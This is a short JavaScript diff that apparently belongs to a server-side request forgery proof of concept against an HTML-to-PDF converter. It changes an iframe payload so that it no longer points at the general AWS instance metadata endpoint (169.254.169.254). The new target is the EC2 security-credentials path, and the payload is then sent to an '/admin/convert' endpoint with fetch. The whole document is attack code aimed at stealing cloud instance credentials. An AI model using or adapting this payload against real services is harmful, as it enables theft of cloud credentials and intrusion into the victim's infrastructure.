@@ -1,4 +1,4 @@
-const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/'></iframe></body>";
+const htmlCode = "<body><iframe src='http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance'></iframe></body>";
 const pdfUrl = "/admin/convert";
 
 fetch(pdfUrl, {
